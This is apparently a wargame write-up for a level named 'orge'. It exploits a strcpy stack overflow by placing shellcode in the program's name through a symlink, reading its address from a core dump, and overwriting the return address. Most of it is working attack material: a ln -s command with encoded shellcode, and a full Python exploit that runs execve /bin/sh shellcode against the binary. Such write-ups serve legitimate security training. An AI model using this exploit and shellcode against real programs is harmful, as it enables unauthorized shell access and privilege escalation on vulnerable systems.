# Vulnerability
```c
char buffer[40];
strcpy(buffer, argv[1]);
```
This program uses strcpy() that does not check boundary.

So, I can overwrite SFP & RET address.

Protection code is:
```c
// here is changed
if(argc != 2){
  printf("argc must be two!\n");
  exit(0);
}

// egghunter 
for(i=0; environ[i]; i++)
  memset(environ[i], 0, strlen(environ[i]));

if(argv[1][47] != '\xbf')
{
  printf("stack is still your friend.\n");
  exit(0);
}

// check the length of argument
if(strlen(argv[1]) > 48){
  printf("argument is too long!\n");
  exit(0);
}
```
The protection that checks argc is 2 or not is added.

# Exploitation
As the program does not reset argv[0], I will pass shellcode in program's name.

```
----------------------------------------------
| NOP(40) | AAAA(4) | RET(argv[0]'s address) |
----------------------------------------------
```

To give shellcode in argv[0], I used `ln -s`:
```bash
[orge@192 orge]$ ln -s ./asdfa ./`python -c 'print "\x90"*10+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"'`
```
And make a core file to get argv[0]'s address:
```
0xbffffbbc:	0x90902f65	0x90909090	0x90909090	0x315e11eb
0xbffffbcc:	0x8032b1c9	0x01ff0e6c	0x7501e980	0xe805ebf6
0xbffffbdc:	0xffffffea	0x6951c132	0x69743030	0x6a633069
```
# Payload
```python
import os
from struct import *

filename = ""
filename = filename + "/home/orge/"
filename = filename + "\x90"*10+"\xeb\x11\x5e\x31\xc9\xb1\x32\x80\x6c\x0e\xff\x01\x80\xe9\x01\x75\xf6\xeb\x05\xe8\xea\xff\xff\xff\x32\xc1\x51\x69\x30\x30\x74\x69\x69\x30\x63\x6a\x6f\x8a\xe4\x51\x54\x8a\xe2\x9a\xb1\x0c\xce\x81"

print len(filename)

payload = ""
payload = payload + "\x90" * 15
payload = payload + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
payload = payload + "AAAA" # SFP
payload = payload + "\xc0\xfb\xff\xbf" # RET

os.execv(filename, [filename, payload])
```


